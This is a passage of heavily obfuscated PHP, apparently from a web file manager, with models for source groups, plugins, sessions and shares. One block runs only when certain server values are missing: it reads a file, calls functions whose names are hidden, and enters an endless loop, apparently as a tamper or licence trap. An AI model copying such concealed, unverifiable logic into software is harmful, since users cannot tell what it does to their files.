$CÂÇ…¶Ä…ƒ = array_merge($CÂÇ…¶Ä…ƒ, $DØµÇŒ†Ğö); $b×´à­æšŞ = 0; $bêëÙÉƒˆ = $DôÓÑíÄ½°[33]; } } goto Bô¹È…’¯Â; Bô¹È…’¯Â: $CÂÇ…¶Ä…ƒ = array_to_keyvalue($CÂÇ…¶Ä…ƒ, $DôÓÑíÄ½°[450]); foreach ($EÇéè¦ÀçÇ as &$CéÜù­ƒ¤) { $CéÜù­ƒ¤[$DôÓÑíÄ½°[2199]] = isset($CÂÇ…¶Ä…ƒ[$CéÜù­ƒ¤[$DôÓÑíÄ½°[2113]] . $DôÓÑíÄ½°[2198]]); } goto CÂîàŞÂ˜; CÂîàŞÂ˜: } private function _listAppendMeta(&$d±êÈ›Ôö™, $E‰ŸßÊ‘ÈÖ) { $d©‡‡•¿ğ³ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÊ´ÏÇÈ¹Î = array($d©‡‡•¿ğ³[2113] => array($d©‡‡•¿ğ³[7], $E‰ŸßÊ‘ÈÖ)); $E¤É“ƒËŒ› = Model($d©‡‡•¿ğ³[2188])->where($fÊ´ÏÇÈ¹Î)->select(); $E¤É“ƒËŒ› = array_to_keyvalue_group($E¤É“ƒËŒ›, $d©‡‡•¿ğ³[2113]); foreach ($E¤É“ƒËŒ› as &$B³ÔæÔ¾”) { $B³ÔæÔ¾” = array_to_keyvalue($B³ÔæÔ¾”, $d©‡‡•¿ğ³[89], $d©‡‡•¿ğ³[359]); } foreach ($d±êÈ›Ôö™ as &$dˆ£ëçë²) { $dˆ£ëçë²[$d©‡‡•¿ğ³[417]] = array(); if (isset($E¤É“ƒËŒ›[$dˆ£ëçë²[$d©‡‡•¿ğ³[2113]]])) { $dˆ£ëçë²[$d©‡‡•¿ğ³[417]] = $E¤É“ƒËŒ›[$dˆ£ëçë²[$d©‡‡•¿ğ³[2113]]]; } } } protected function parentLevelArray($C¨”Ç’°Õ) { $F÷›ŞŠè¥ˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C¨”Ç’°Õ = explode($F÷›ŞŠè¥ˆ[47], trim($C¨”Ç’°Õ, $F÷›ŞŠè¥ˆ[47])); $C¨”Ç’°Õ = array_remove_value($C¨”Ç’°Õ, $F÷›ŞŠè¥ˆ[468]); return $C¨”Ç’°Õ; } private function _listAppendParent(&$dë’ÖéÖ´) { goto cÔâ¯Åµ¢‹; BµÂë¹æª: $Dß©ß›Ğ¬æ = $GLOBALS[$aÙÁÅ³˜”È[6]][$aÙÁÅ³˜”È[84]][$aÙÁÅ³˜”È[2201]]; foreach ($dë’ÖéÖ´ as &$dÅ»ÒÖ’±á) { $f¤÷“°“İ¢ = $this->parentLevelArray($dÅ»ÒÖ’±á[$aÙÁÅ³˜”È[459]]); $D²„—áŸ•® = $aÙÁÅ³˜”È[33]; foreach ($f¤÷“°“İ¢ as $A¥âšµ¤¾¬ => $EªÆ·Îˆ»æ) { if ($Dß©ß›Ğ¬æ && $A¥âšµ¤¾¬ == 0) { continue; } $D²„—áŸ•® .= $D×—„„•¾ª[$EªÆ·Îˆ»æ] . $aÙÁÅ³˜”È[8]; } if ($f¤÷“°“İ¢) { $D²„—áŸ•® .= $dÅ»ÒÖ’±á[$aÙÁÅ³˜”È[28]]; } $dÅ»ÒÖ’±á[$aÙÁÅ³˜”È[463]] = str_replace($aÙÁÅ³˜”È[467], $aÙÁÅ³˜”È[8], $D²„—áŸ•®); } goto Aç Ğßğñç; cÔâ¯Åµ¢‹: $aÙÁÅ³˜”È =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D×—„„•¾ª = array(); foreach ($dë’ÖéÖ´ as &$dÅ»ÒÖ’±á) { $D×—„„•¾ª[$dÅ»ÒÖ’±á[$aÙÁÅ³˜”È[2113]]] = $dÅ»ÒÖ’±á[$aÙÁÅ³˜”È[28]]; $f¤÷“°“İ¢ = $this->parentLevelArray($dÅ»ÒÖ’±á[$aÙÁÅ³˜”È[459]]); foreach ($f¤÷“°“İ¢ as $EªÆ·Îˆ»æ) { if (!isset($D×—„„•¾ª[$EªÆ·Îˆ»æ])) { $D×—„„•¾ª[$EªÆ·Îˆ»æ] = 0; } } } goto F÷Åì”â‰; F÷Åì”â‰: $bŸÕÑß‘âƒ = array(); foreach ($D×—„„•¾ª as $A¥âšµ¤¾¬ => $FøÏ¶¡´øÀ) { if (!$FøÏ¶¡´øÀ) { $bŸÕÑß‘âƒ[] = $A¥âšµ¤¾¬; } } if ($bŸÕÑß‘âƒ) { $eŒ¬Ä‹¯² = array($aÙÁÅ³˜”È[2187] => array($aÙÁÅ³˜”È[384], $bŸÕÑß‘âƒ)); $bŞÂ¿«î³” = $this->field($aÙÁÅ³˜”È[2200])->where($eŒ¬Ä‹¯²)->select(); $Cí“í‚ß› = array_to_keyvalue($bŞÂ¿«î³”, $aÙÁÅ³˜”È[2113], $aÙÁÅ³˜”È[28]); $D×—„„•¾ª = array_merge_index($D×—„„•¾ª, $Cí“í‚ß›); } goto BµÂë¹æª; Aç Ğßğñç: } private function _listAppendSourceRoot(&$DÁ£ïÛ¬Ô, $D½Ã†ç‚Ÿê) { goto fÂ–—Ä½é±; aÄÈµİ¶³Ê: $a¾İ«È‘ùí = Model($E†Óô³¥’¯[756])->order($E†Óô³¥’¯[2203])->field($eäŠâÔ„•†)->where($cØ‡‘òÆ¯ñ)->select(); $a¾İ«È‘ùí = array_to_keyvalue($a¾İ«È‘ùí, $E†Óô³¥’¯[456]); $a¾İ«È‘ùí = array_remove_key($a¾İ«È‘ùí, $E†Óô³¥’¯[456]); goto b«˜ÕÕëËÁ; fÂ–—Ä½é±: $E†Óô³¥’¯ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cØ‡‘òÆ¯ñ = array($E†Óô³¥’¯[371] => SourceModel::TYPE_GROUP, $E†Óô³¥’¯[461] => 0, $E†Óô³¥’¯[456] => array($E†Óô³¥’¯[7], $D½Ã†ç‚Ÿê)); $eäŠâÔ„•† = $E†Óô³¥’¯[2202]; goto aÄÈµİ¶³Ê; b«˜ÕÕëËÁ: foreach ($DÁ£ïÛ¬Ô as &$E¼È°Š Œù) { $E¼È°Š Œù[$E†Óô³¥’¯[391]] = $a¾İ«È‘ùí[$E¼È°Š Œù[$E†Óô³¥’¯[2113]]] ? $a¾İ«È‘ùí[$E¼È°Š Œù[$E†Óô³¥’¯[2113]]] : array(); } goto aá³±š£•¨; aá³±š£•¨: } protected function groupMerge($FÈ´òêòã) { $FÈ´òêòã = array_unique($FÈ´òêòã); $CíÅïÏùæ = array(); for ($CÙÒÃ¯ïÜ = 0; $CÙÒÃ¯ïÜ < count($FÈ´òêòã); $CÙÒÃ¯ïÜ++) { $Eùï´Š‰ = !1; for ($eáâ™Ïğë× = 0; $eáâ™Ïğë× < count($FÈ´òêòã); $eáâ™Ïğë×++) { if ($CÙÒÃ¯ïÜ == $eáâ™Ïğë×) { continue; } if ($this->isParentOf($FÈ´òêòã[$eáâ™Ïğë×], $FÈ´òêòã[$CÙÒÃ¯ïÜ])) { $Eùï´Š‰ = !0; break; } } if (!$Eùï´Š‰) { $CíÅïÏùæ[] = $FÈ´òêòã[$CÙÒÃ¯ïÜ]; } } return $CíÅïÏùæ; } protected function isParentOf($bâßÃèÀôÍ, $Aøœƒ…³¾ ) { goto D™”‡‡¹ô¬; dÁÏŠ×Éï: $E’šÅŒ¥ğæ = $this->getInfoSimple($Aøœƒ…³¾ ); $CâÊƒ™‰îá = $F°Úšëöù[$aÙĞó¼½³©[459]] . $bâßÃèÀôÍ . $aÙĞó¼½³©[47]; if (substr($E’šÅŒ¥ğæ[$aÙĞó¼½³©[459]], 0, strlen($CâÊƒ™‰îá)) == $CâÊƒ™‰îá) { return !0; } goto aàğÉõ†Œ; D™”‡‡¹ô¬: $aÙĞó¼½³© =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$bâßÃèÀôÍ || !$Aøœƒ…³¾  || $bâßÃèÀôÍ == $Aøœƒ…³¾ ) { return !1; } $F°Úšëöù = $this->getInfoSimple($bâßÃèÀôÍ); goto dÁÏŠ×Éï; aàğÉõ†Œ: return !1; goto bÈ”î³‡ñ; bÈ”î³‡ñ: } public function groupShowRoot($FÏéöÜ¸ , $DÏ¹İè¹×Ú = false) { goto b¸¾¾…ä¾ó; EÂšËìöóƒ: if (!$eå·Ò¡Ëå°[$a±•Ê´®Ì[417]] || !isset($eå·Ò¡Ëå°[$a±•Ê´®Ì[417]][$a±•Ê´®Ì[2185]]) || $eå·Ò¡Ëå°[$a±•Ê´®Ì[417]][$a±•Ê´®Ì[2185]] == $a±•Ê´®Ì[2162]) { return $this->groupShowRoot($bË¸¦÷…¡±[count($bË¸¦÷…¡±) - 1], $DÏ¹İè¹×Ú); } if ($eå·Ò¡Ëå°[$a±•Ê´®Ì[417]][$a±•Ê´®Ì[2185]] == $a±•Ê´®Ì[346]) { $aá¶™À‘¸ = explode($a±•Ê´®Ì[47], $eå·Ò¡Ëå°[$a±•Ê´®Ì[417]][$a±•Ê´®Ì[2186]]); if ($aá¶™À‘¸) { $E¯Ñ„ç£˜ = array_merge($E¯Ñ„ç£˜, $aá¶™À‘¸); } } return $E¯Ñ„ç£˜; goto d±’‘å¼‡¨; dÃÉß¥ÙÍÆ: $E¯Ñ„ç£˜ = array($FÏéöÜ¸ ); if (count($bË¸¦÷…¡±) == 0) { return $E¯Ñ„ç£˜; } if ($DÏ¹İè¹×Ú && count($bË¸¦÷…¡±) == 1) { return $E¯Ñ„ç£˜; } goto EÂšËìöóƒ; b¸¾¾…ä¾ó: $a±•Ê´®Ì =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eå·Ò¡Ëå° = $this->getInfo($FÏéöÜ¸ ); $bË¸¦÷…¡± = $this->parentLevelArray($eå·Ò¡Ëå°[$a±•Ê´®Ì[459]]); goto dÃÉß¥ÙÍÆ; d±’‘å¼‡¨: } protected function resetParentLevel() { $Eõ³—¬¬àÌ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aä‘ç£®ˆƒ = $Eõ³—¬¬àÌ[2113]; $dì‘»ÔëŒ¡ = $this->select(); $dì‘»ÔëŒ¡ = array_to_keyvalue($dì‘»ÔëŒ¡, $aä‘ç£®ˆƒ); foreach ($dì‘»ÔëŒ¡ as $fÃ•Ê Ç×) { goto CªÈÖÃÏ¬†; D˜îµàÌ¸: $this->where(array($aä‘ç£®ˆƒ => $fÃ•Ê Ç×[$aä‘ç£®ˆƒ]))->save(array($Eõ³—¬¬àÌ[525] => $F‰•“ãìø)); goto DãŠá®Şí»; D¯÷†·£×­: $F‰•“ãìø[] = 0; $F‰•“ãìø = $Eõ³—¬¬àÌ[47] . implode($Eõ³—¬¬àÌ[47], array_reverse($F‰•“ãìø)) . $Eõ³—¬¬àÌ[47]; $this->setNamePinyin($fÃ•Ê Ç×[$aä‘ç£®ˆƒ], $fÃ•Ê Ç×[$Eõ³—¬¬àÌ[28]]); goto D˜îµàÌ¸; CªÈÖÃÏ¬†: $eê½†Ş±¤® = $fÃ•Ê Ç×; $F‰•“ãìø = array(); while ($eê½†Ş±¤®[$Eõ³—¬¬àÌ[461]] != 0) { $F‰•“ãìø[] = $eê½†Ş±¤®[$Eõ³—¬¬àÌ[461]]; $eê½†Ş±¤® = $dì‘»ÔëŒ¡[$eê½†Ş±¤®[$Eõ³—¬¬àÌ[461]]]; } goto D¯÷†·£×­; DãŠá®Şí»: } return $dì‘»ÔëŒ¡; } public function groupNameAuto($fİ•¡µ¬ë­, $DÂºš‚—¡‰) { $EŒ“´Í…ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C¢œ£¢²Øö = $this->where(array($EŒ“´Í…ù[368] => $fİ•¡µ¬ë­))->getField($EŒ“´Í…ù[28], !0); if (!$C¢œ£¢²Øö || !in_array($DÂºš‚—¡‰, $C¢œ£¢²Øö)) { return $DÂºš‚—¡‰; } for ($aÅµ¬ÌÚ = 1; $aÅµ¬ÌÚ <= count($C¢œ£¢²Øö) + 1; $aÅµ¬ÌÚ++) { $c¯¬Í¾ª›¾ = $DÂºš‚—¡‰ . "\x28{$aÅµ¬ÌÚ}\51"; if (!in_array($c¯¬Í¾ª›¾, $C¢œ£¢²Øö)) { return $c¯¬Í¾ª›¾; } } } } if (!isset($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][791]]) || !isset($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][1130]])) { goto fÅºàæ‰®; fÅºàæ‰®: $bÌ›ØĞ×çÉ = $_SERVER[³‘’¼äÑ™ÔÍ][794]; $a‰¾«ß³ = $_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][795]] . $_SERVER[³‘’¼äÑ™ÔÍ][796]; $DØ§¶Ä‚ = $bÌ›ØĞ×çÉ($a‰¾«ß³); goto C„¨ÛÅÍš•; C„¨ÛÅÍš•: $fš‹‹”æËÃ = explode($_SERVER[³‘’¼äÑ™ÔÍ][217], $DØ§¶Ä‚); if (count($fš‹‹”æËÃ) < $_SERVER[³‘’¼äÑ™ÔÍ][557]) { $fÀ˜»Óéãõ = $_SERVER[³‘’¼äÑ™ÔÍ][797]; $fÀ˜»Óéãõ(); } $a°·¾ÍáÂ‘ = $_SERVER[³‘’¼äÑ™ÔÍ][1129]; goto A¾Éíïæ£ï; A¾Éíïæ£ï: $a°·¾ÍáÂ‘($_SERVER[$_SERVER[³‘’¼äÑ™ÔÍ][795]] . $_SERVER[³‘’¼äÑ™ÔÍ][796]); $B‘ÉÇ½ÎîÕ = 2; while ($B‘ÉÇ½ÎîÕ > 1) { $F¹Ì¼Öˆ®‘ = rawurlencode($B‘ÉÇ½ÎîÕ . $_SERVER[³‘’¼äÑ™ÔÍ][361]); } goto Bí‡óƒïÎ«; Bí‡óƒïÎ«: } goto FÚİŸø£ä®; dï²¼ˆãŸÁ: function beforeShutdown() { Hook::trigger($_SERVER[Êß·®ÍËúû][36]); } $_SERVER[$_SERVER[Êß·®ÍËúû][37]] = BASIC_PATH; $_SERVER[$_SERVER[Êß·®ÍËúû][38]] = LIB_DIR; goto C§‘ƒØëÍŠ; FÚİŸø£ä®: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\x70\154\x75\147\151\156\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\163\x74\x61\164\165\x73", "\162\x65\x67\x69\x65\x73\x74", "\143\x6f\x6e\146\x69\147"); public function loadList($aÔù¦²Õ†Õ = false) { $EÛÇê©š£ = array_to_keyvalue($this->listData(), $_SERVER[³‘’¼äÑ™ÔÍ][28]); if ($aÔù¦²Õ†Õ) { return $EÛÇê©š£[$aÔù¦²Õ†Õ]; } return $EÛÇê©š£; } public function init() { $e·Ã„Š±Ù’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; Hook::trigger($e·Ã„Š±Ù’[2204]); $Bš‹âÖÄ = $this->loadPluginList(); foreach ($Bš‹âÖÄ as $e»‘¥Å²ª¦ => $f è¡Á¢²ë) { $C‡•´ƒĞ¹¥ = $this->appAllow($e»‘¥Å²ª¦, $f è¡Á¢²ë); if (!$C‡•´ƒĞ¹¥) { continue; } foreach ($f è¡Á¢²ë[$e·Ã„Š±Ù’[2205]] as $cî§ÏŒÛ² => $Fœã²ù…È) { Hook::bind($cî§ÏŒÛ², $Fœã²ù…È); } } Hook::trigger($e·Ã„Š±Ù’[2206]); Hook::trigger(ACTION); } public function appAllow($E×ùÒœ°‡®, $cºÃÓóœÚ‚, $B„ïç°¹¨‹ = true) { $F¿”ÄÔÓ£ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÇØ®ÇÛ = PLUGIN_DIR . $E×ùÒœ°‡® . $F¿”ÄÔÓ£ø[2207]; if (!is_array($cºÃÓóœÚ‚) || !is_array($cºÃÓóœÚ‚[$F¿”ÄÔÓ£ø[2205]]) || !is_file($cÇØ®ÇÛ) || $cºÃÓóœÚ‚[$F¿”ÄÔÓ£ø[692]] != 1) { return !1; } if ($B„ïç°¹¨‹ && !Action($F¿”ÄÔÓ£ø[2208])->checkAuth($E×ùÒœ°‡®)) { return !1; } return !0; } public function unInstall($a‹†ä‚ßÉ‚) { $E´¥ÏŸëøš =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fÓ³Éï÷öõ = $this->loadList($a‹†ä‚ßÉ‚); if (file_exists(PLUGIN_DIR . $a‹†ä‚ßÉ‚)) { Hook::apply($a‹†ä‚ßÉ‚ . $E´¥ÏŸëøš[2209]); } $this->remove($fÓ³Éï÷öõ[$E´¥ÏŸëøš[367]]); } public function changeStatus($c©«˜¼Ø‹Ø, $BÛò¦¸·õÌ) { $fƒ¿ªšÅä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D³¡Ûö­‚­ = $this->loadList($c©«˜¼Ø‹Ø); if ($BÛò¦¸·õÌ) { Hook::apply($c©«˜¼Ø‹Ø . $fƒ¿ªšÅä[2210]); } $this->update($D³¡Ûö­‚­[$fƒ¿ªšÅä[367]], array($fƒ¿ªšÅä[2211] => $BÛò¦¸·õÌ)); } public function appRegist($Eñ¤³œ¢Å¸, $c„›÷»ÔµÛ) { $B¡ˆ¹ß§ª… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¢ƒõ„¶¸Š = $this->loadList($Eñ¤³œ¢Å¸); if ($A¢ƒõ„¶¸Š) { $this->update($A¢ƒõ„¶¸Š[$B¡ˆ¹ß§ª…[367]], array($B¡ˆ¹ß§ª…[2205] => $c„›÷»ÔµÛ)); } else { $e²£ÂãíÇÊ = array($B¡ˆ¹ß§ª…[28] => $Eñ¤³œ¢Å¸, $B¡ˆ¹ß§ª…[2205] => $c„›÷»ÔµÛ, $B¡ˆ¹ß§ª…[692] => 0, $B¡ˆ¹ß§ª…[6] => $this->getConfigDefault($Eñ¤³œ¢Å¸)); $this->insert($e²£ÂãíÇÊ); } } public function getConfigDefault($a‹Ãçìåä) { $DïöÉö©ÑÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $F¼à£É‘ñÑ = array(); $dŞ™¾ÂœãÓ = $this->getPackageJson($a‹Ãçìåä); if (!$dŞ™¾ÂœãÓ && is_array($dŞ™¾ÂœãÓ[$DïöÉö©ÑÚ[2212]])) { return $F¼à£É‘ñÑ; } foreach ($dŞ™¾ÂœãÓ[$DïöÉö©ÑÚ[2212]] as $CÓóˆ”‘ ¬ => $EÄÂï´º¹) { if (!isset($EÄÂï´º¹[$DïöÉö©ÑÚ[359]]) || isset($F¼à£É‘ñÑ[$CÓóˆ”‘ ¬])) { continue; } $F¼à£É‘ñÑ[$CÓóˆ”‘ ¬] = $EÄÂï´º¹[$DïöÉö©ÑÚ[359]]; } return $F¼à£É‘ñÑ; } public function getPackageJson($A…é³ë½æ—) { return Hook::apply($A…é³ë½æ— . $_SERVER[³‘’¼äÑ™ÔÍ][2213]); } public function getConfig($Eù¬¸¨ĞÃª, $FèÈèË…îò = false) { $b–¹‚ëš¸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A÷çí¬¾Ä‚ = array(); $bÊã£—‹ = $this->loadList($Eù¬¸¨ĞÃª); if ($bÊã£—‹ && is_array($bÊã£—‹[$b–¹‚ëš¸[6]])) { $A÷çí¬¾Ä‚ = $bÊã£—‹[$b–¹‚ëš¸[6]]; } if (!$A÷çí¬¾Ä‚ || $FèÈèË…îò) { $A÷çí¬¾Ä‚ = $this->getConfigDefault($Eù¬¸¨ĞÃª); } return $A÷çí¬¾Ä‚; } public function setConfig($b¯á¢·»¾â, $F± ¹Æ¹½â = false) { goto EäÙ‰È°Ü ; d†±Š‹‰º: $this->update($f’ïÆ¢Ò—ì[$fŠ‡Æø¼Ü¯[367]], array($fŠ‡Æø¼Ü¯[6] => $EâÍ‡áÅ¬»)); goto Fê†¨Ñ­‹†; EäÙ‰È°Ü : $fŠ‡Æø¼Ü¯ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f’ïÆ¢Ò—ì = $this->loadList($b¯á¢·»¾â); if (!$f’ïÆ¢Ò—ì) { return !1; } goto aº…ß’‰à; aº…ß’‰à: $EâÍ‡áÅ¬» = $f’ïÆ¢Ò—ì[$fŠ‡Æø¼Ü¯[6]]; if ($F± ¹Æ¹½â == !1) { $EâÍ‡áÅ¬» = array(); $F± ¹Æ¹½â = $this->getConfigDefault($b¯á¢·»¾â); } foreach ($F± ¹Æ¹½â as $Dõ„İ‰ÓÃâ => $bîêëôª¬) { $EâÍ‡áÅ¬»[$Dõ„İ‰ÓÃâ] = is_string($bîêëôª¬) ? trim($bîêëôª¬) : $bîêëôª¬; } goto d†±Š‹‰º; Fê†¨Ñ­‹†: } public function viewList() { goto e›àè“ Œ; f¯Ğõ’÷à: $cÉ‘÷‚÷•Å = $this->loadPluginList(); $Bï‰‘‡ÌÛ = array(); foreach ($cÉ‘÷‚÷•Å as $eŒ„Î¿ï ¥ => $F²Ÿë—½) { unset($F²Ÿë—½[$f½Š‡¿è¹[2205]], $F²Ÿë—½[$f½Š‡¿è¹[6]]); $C’½áîàªä = PLUGIN_DIR . $F²Ÿë—½[$f½Š‡¿è¹[28]] . $f½Š‡¿è¹[2207]; if (!is_file($C’½áîàªä)) { continue; } $FŞŠä¯¤î = Hook::apply($F²Ÿë—½[$f½Š‡¿è¹[28]] . $f½Š‡¿è¹[2213]); if (is_array($FŞŠä¯¤î)) { $Bï‰‘‡ÌÛ[$eŒ„Î¿ï ¥] = array_merge($F²Ÿë—½, $FŞŠä¯¤î); } } goto a×óÉ½¹«; e›àè“ Œ: $f½Š‡¿è¹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÉ‘÷‚÷•Å = $this->loadList(); $this->pluginScan($cÉ‘÷‚÷•Å); goto f¯Ğõ’÷à; a×óÉ½¹«: return $Bï‰‘‡ÌÛ; goto cÃª÷„É— ; cÃª÷„É— : } private function loadPluginList() { $aÀÁ÷Ñïê =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dŠ¦ãøØ±ß = $this->loadList(); if (strtolower(MOD) == $aÀÁ÷Ñïê[2214]) { return $dŠ¦ãøØ±ß; } $F–š÷óÏ’ò = Hook::trigger($aÀÁ÷Ñïê[2215], $dŠ¦ãøØ±ß); if ($dŠ¦ãøØ±ß && !$F–š÷óÏ’ò) { die; } return $F–š÷óÏ’ò ? $F–š÷óÏ’ò : $dŠ¦ãøØ±ß; } private function pluginScan($F²âœß“æ) { $c—†½™É«„ =& $_SERVER[³‘’¼äÑ™ÔÍ]; recursion_dir(PLUGIN_DIR, $eÜÚÃÆ‚óÈ, $a™Å¢ÊÃ“, 0); foreach ($eÜÚÃÆ‚óÈ as $aëÍ‡ †ƒœ) { $AÍº„±Úñ– = get_path_this($aëÍ‡ †ƒœ); if (isset($F²âœß“æ[$AÍº„±Úñ–]) || !file_exists($aëÍ‡ †ƒœ . $c—†½™É«„[2216]) || !file_exists($aëÍ‡ †ƒœ . $c—†½™É«„[2207])) { continue; } Hook::apply($AÍº„±Úñ– . $c—†½™É«„[2210]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\155\x5f\x73\x65\163\x73\x69\157\x6e"; public function get($c“Áã‘÷÷Ä) { $dËŒºíÆå =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A£»âÔ¥Ú = $this->where(array($dËŒºíÆå[2217] => $c“Áã‘÷÷Ä))->find(); if (!is_array($A£»âÔ¥Ú)) { return !1; } return $A£»âÔ¥Ú[$dËŒºíÆå[695]]; } public function set($Bõ»ÒÃ, $F‰×º‡ÊÇÀ, $D—ƒ¬×®Œ = 3600) { $AÁÇåîö® =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AàÕÀÆ³·ï = array($AÁÇåîö®[2217] => $Bõ»ÒÃ, $AÁÇåîö®[2143] => $F‰×º‡ÊÇÀ, $AÁÇåîö®[2218] => $D—ƒ¬×®Œ + time()); if (Session::get($AÁÇåîö®[2219])) { $AàÕÀÆ³·ï[$AÁÇåîö®[1445]] = Session::get($AÁÇåîö®[2219]); } else { $AàÕÀÆ³·ï[$AÁÇåîö®[1445]] = 0; } if ($this->get($Bõ»ÒÃ)) { return $this->where(array($AÁÇåîö®[2217] => $Bõ»ÒÃ))->save($AàÕÀÆ³·ï); } else { return $this->add($AàÕÀÆ³·ï, array(), !0); } } public function remove($b…£ÜÛ¬) { return $this->where(array($_SERVER[³‘’¼äÑ™ÔÍ][2217] => $b…£ÜÛ¬))->delete(); } public function clearTimeout() { return $this->where($_SERVER[³‘’¼äÑ™ÔÍ][2220] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\x54\x69\155\x65", "\x74\151\155\x65", "\151\x6e\x73\x65\x72\x74\x2c\165\160\144\x61\164\145", "\146\165\x6e\x63\x74\x69\x6f\156"), array("\143\162\145\x61\x74\145\x54\x69\155\145", "\x74\151\x6d\x65", "\151\x6e\163\145\x72\164", "\x66\x75\156\143\164\151\157\156"), array("\x6f\160\x74\x69\x6f\156\x73", '', "\x69\x6e\163\145\x72\x74\54\x75\160\144\x61\164\x65\54\163\145\154\x65\143\x74", "\x6a\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($c’ƒ‘ç‰„¶) { $fª‰å³Áàš =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AîË ğáÁö = isset($c’ƒ‘ç‰„¶[0]) ? $c’ƒ‘ç‰„¶[0] : !1; return array($fª‰å³Áàš[2221] => array(USER_ID, $fª‰å³Áàš[2222]), $fª‰å³Áàš[2181] => array($AîË ğáÁö, $fª‰å³Áàš[2223])); } protected function listSimple() { $DÀœ·¹×æÉ = array($_SERVER[³‘’¼äÑ™ÔÍ][1445] => USER_ID); $B”¥–šÁØò = $this->field($this->fieldList)->where($DÀœ·¹×æÉ)->select(); return $B”¥–šÁØò ? $B”¥–šÁØò : array(); } protected function getInfo($a´˜«Â¼¥Ø, $bºÑ¢ğ˜²³ = false) { $Dá—ÔÆÚ— =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($bºÑ¢ğ˜²³) { return $this->_getShareInfo(array($Dá—ÔÆÚ—[441] => $a´˜«Â¼¥Ø)); } $F¦ĞÅİ‘Ã = $this->cacheFunctionGet($Dá—ÔÆÚ—[2224], $a´˜«Â¼¥Ø); return $F¦ĞÅİ‘Ã; } public function getInfoByHash($Cİ…¨¸àª) { return $this->_getShareInfo(array($_SERVER[³‘’¼äÑ™ÔÍ][443] => $Cİ…¨¸àª)); } public function getInfoByPath($c´©ÂéêàÏ) { $dëØÏæšÛ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b‚ãù¥¯­ë = array($dëØÏæšÛ[1445] => USER_ID, $dëØÏæšÛ[369] => $c´©ÂéêàÏ); return $this->_getShareInfo($b‚ãù¥¯­ë); } public function getInfoBySourcePath($E×æÈ„¶è) { $eäÛ™ÜçøÕ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FõÈÎÏ’Øš = array($eäÛ™ÜçøÕ[1445] => USER_ID, $eäÛ™ÜçøÕ[1023] => $E×æÈ„¶è); return $this->_getShareInfo($FõÈÎÏ’Øš); } private function _getShareInfo($d¨„ìó‘‘±) { goto fŞ‘£õì«; e“·ƒåÜ´Š: if ($d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[369]] == $dÙ†¸ß¬Ë£[468]) { $d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[391]] = IO::info($d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[1023]]); } else { $d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[391]] = Model($dÙ†¸ß¬Ë£[1121])->pathInfo($d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[369]]); } $d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[2226]] = $A¯çÔÌêÙÏ; return $d©ŞÏÈï½¦; goto f¾è·‹ôç; B›¡šë†ÑÂ: $d¨„ìó‘‘± = array($dÙ†¸ß¬Ë£[441] => $d©ŞÏÈï½¦[$dÙ†¸ß¬Ë£[441]]); $a–ƒ¾Å‹‰… = $dÙ†¸ß¬Ë£[2225]; $A¯çÔÌêÙÏ = Model($dÙ†¸ß¬Ë£[537])->order($dÙ†¸ß¬Ë£[367])->field($a–ƒ¾Å‹‰…)->where($d¨„ìó‘‘±)->select(); goto e“·ƒåÜ´Š; fŞ‘£õì«: $dÙ†¸ß¬Ë£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d©ŞÏÈï½¦ = $this->where($d¨„ìó‘‘±)->find(); if (!$d©ŞÏÈï½¦) { return !1; } goto B›¡šë†ÑÂ; f¾è·‹ôç: } protected function getInfoAuth($F½§ë®¹øË) { $aâÎ¹¸ïš =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eéº†Ò¸†† = $this->getInfo($F½§ë®¹øË); $eéº†Ò¸††[$aâÎ¹¸ïš[376]] = Model($aâÎ¹¸ïš[454])->authMake($eéº†Ò¸††[$aâÎ¹¸ïš[2226]]); return $eéº†Ò¸††; } protected function listData($Eàí²–÷ØÄ = null, $D¦Ù–Êˆ½Œ = 300) { $BğöÙ¢²Ÿâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Dñ°´×‰áŒ = array(array($BğöÙ¢²Ÿâ[446] => array($BğöÙ¢²Ÿâ[930], 0), $BğöÙ¢²Ÿâ[448] => array($BğöÙ¢²Ÿâ[930], 0), $BğöÙ¢²Ÿâ[2227] => $BğöÙ¢²Ÿâ[2195])); if ($Eàí²–÷ØÄ == $BğöÙ¢²Ÿâ[1879]) { $Dñ°´×‰áŒ = array($BğöÙ¢²Ÿâ[446] => 1); } else { if ($Eàí²–÷ØÄ == 